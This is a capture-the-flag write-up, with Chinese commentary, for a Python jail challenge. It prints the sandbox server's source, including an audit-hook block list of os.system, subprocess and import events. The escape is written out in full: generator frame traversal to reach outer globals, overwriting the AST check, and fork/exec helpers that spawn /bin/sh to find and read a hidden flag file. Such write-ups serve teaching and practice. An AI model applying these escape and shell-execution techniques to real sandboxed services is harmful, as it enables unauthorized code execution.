## PyJail

```python
import socketserver
import sys
import ast
import io

with open(__file__, "r", encoding="utf-8") as f:
    source_code = f.read()

class SandboxVisitor(ast.NodeVisitor):
    def visit_Attribute(self, node):
        if isinstance(node.attr, str) and node.attr.startswith("__"):
            raise ValueError("Access to private attributes is not allowed")
        self.generic_visit(node)

def safe_exec(code: str, sandbox_globals=None):
    original_stdout = sys.stdout
    original_stderr = sys.stderr

    sys.stdout = io.StringIO()
    sys.stderr = io.StringIO()

    if sandbox_globals is None:
        sandbox_globals = {
            "__builtins__": {
                "print": print,
                "any": any,
                "len": len,
                "RuntimeError": RuntimeError,
                "addaudithook": sys.addaudithook,
                "original_stdout": original_stdout,
                "original_stderr": original_stderr
            }
        }

    try:
        tree = ast.parse(code)
        SandboxVisitor().visit(tree)

        exec(code, sandbox_globals)
        output = sys.stdout.getvalue()

        sys.stdout = original_stdout
        sys.stderr = original_stderr

        return output, sandbox_globals
    except Exception as e:
        sys.stdout = original_stdout
        sys.stderr = original_stderr
        return f"Error: {str(e)}", sandbox_globals


CODE = """
def my_audit_checker(event, args):
    blocked_events = [
        "import", "time.sleep", "builtins.input", "builtins.input/result", "open", "os.system",
         "eval","subprocess.Popen", "subprocess.call", "subprocess.run", "subprocess.check_output"
    ]
    if event in blocked_events or event.startswith("subprocess."):
        raise RuntimeError(f"Operation not allowed: {event}")

addaudithook(my_audit_checker)

"""


class Handler(socketserver.BaseRequestHandler):
    def handle(self):
        self.request.sendall(b"Welcome to Interactive Pyjail!\n")
        self.request.sendall(b"Rules: No import / No sleep / No input\n\n")

        try:
            self.request.sendall(b"========= Server Source Code =========\n")
            self.request.sendall(source_code.encode() + b"\n")
            self.request.sendall(b"========= End of Source Code =========\n\n")
        except Exception as e:
            self.request.sendall(b"Failed to load source code.\n")
            self.request.sendall(str(e).encode() + b"\n")

        self.request.sendall(b"Type your code line by line. Type 'exit' to quit.\n\n")

        prefix_code = CODE
        sandbox_globals = None

        while True:
            self.request.sendall(b">>> ")
            try:
                user_input = self.request.recv(4096).decode().strip()
                if not user_input:
                    continue
                if user_input.lower() == "exit":
                    self.request.sendall(b"Bye!\n")
                    break
                if len(user_input) > 100:
                    self.request.sendall(b"Input too long (max 100 chars)!\n")
                    continue

                full_code = prefix_code + user_input + "\n"
                prefix_code = ""

                result, sandbox_globals = safe_exec(full_code, sandbox_globals)
                self.request.sendall(result.encode() + b"\n")
            except Exception as e:
                self.request.sendall(f"Error occurred: {str(e)}\n".encode())
                break


if __name__ == "__main__":
    HOST, PORT = "0.0.0.0", 5000
    with socketserver.ThreadingTCPServer((HOST, PORT), Handler) as server:
        print(f"Server listening on {HOST}:{PORT}")
        server.serve_forever()
```

生成器栈帧逃逸： https://www.cnblogs.com/gaorenyusi/p/18242719

拿到exec外部globals, 然后重写visit_Attribute

os模块没ban完就ban了最常见的system,popen

回显因为有"original_stdout": original_stdout很容易读出来

长度100限制只需将代码写成`exec("code")`, code部分拼接就行

然后flag.txt告诉flag最后修改时间2025.5.1 find找就行了（或者直接看start.sh能看到flag在哪）flag位置：`/tmp/.\x0a\x0b\x00hidden/flagD`

`cat /tmp/.*/flagD`就行

```python
>>> a = (a.gi_frame.f_back.f_back for i in [1])

>>> a = [x for x in a][0]

>>> globals = a.f_back.f_back.f_globals

>>> globals['SandboxVisitor'].visit_Attribute=lambda x,y:None

>>> os=globals["__builtins__"].__import__("os")

>>> sys=globals["__builtins__"].__import__("sys")

>>> iter=globals["__builtins__"].iter

>>> exec=globals["__builtins__"].exec

>>> a='run_command = lambda cmd: ((lambda r, w, pid: ((pid == 0 and (os.close(r), os.dup2(w,'

>>> a+='original_stdout.fileno()),os.dup2(w, original_stdout.fileno()),os.execlp("/bin/sh", "sh"'

>>> a+=', "-c", cmd) )) or (os.close(w), (output :=b"".join(iter(lambda: os.read(r, 4096), b""))'

>>> a+='.decode()),os.close(r), os.waitpid(pid, 0),output )[4] ))(*os.pipe(), os.fork()))'

>>> exec(a)

>>> print(run_command("find / -type f -newermt '2025-05-01 00:00:00' ! -newermt '2025-05-02 00:00:00'"))
/tmp/.\x0a\x0b\x00hidden/flagD

>>> print(run_command('cat /tmp/.*/flagD'))
miniLCTF{Fl4G-GeNER4ted_In_M1niIctf2OZS_with_IOvE286}
```

这里实际run_command就是

```python
import os
import sys

run_command = lambda cmd: (
    (lambda r, w, pid: (
        (pid == 0 and (
            os.close(r),
            os.dup2(w, sys.stdout.fileno()),
            os.dup2(w, sys.stderr.fileno()),
            os.execlp("/bin/sh", "sh", "-c", cmd)
        )) or (
            os.close(w),
            (output := b"".join(iter(lambda: os.read(r, 4096), b"")).decode()),
            os.close(r),
            os.waitpid(pid, 0),
            output
        )[4]
    ))(*os.pipe(), os.fork())
)

print(run_command("ls"))
```

还可以用其他底层的os函数

比如os.execvp os.forkpty os.spawn可以自己试试

```python
import os
import sys

def run_command(cmd):
    r, w = os.pipe()
    pid = os.fork()
    if pid == 0:
        os.close(r)
        os.dup2(w, 1)
        os.dup2(w, 2)
        os.close(w)
        os.execvp("/bin/sh", ["/bin/sh", "-c", cmd])
        os._exit(1)
    else:
        os.close(w)
        with os.fdopen(r) as f:
            output = f.read()
        os.waitpid(pid, 0)
        return output

print(run_command("ls -l"))



import os

def run_command(cmd):
    pid, fd = os.forkpty()
    if pid == 0:
        os.execvp("sh", ["sh", "-c", cmd])
    else:
        output = b''
        while True:
            try:
                data = os.read(fd, 1024)
                if not data:
                    break
                output += data
            except OSError:
                break
        os.waitpid(pid, 0)
        return output.decode()

print(run_command("ls -l"))
```

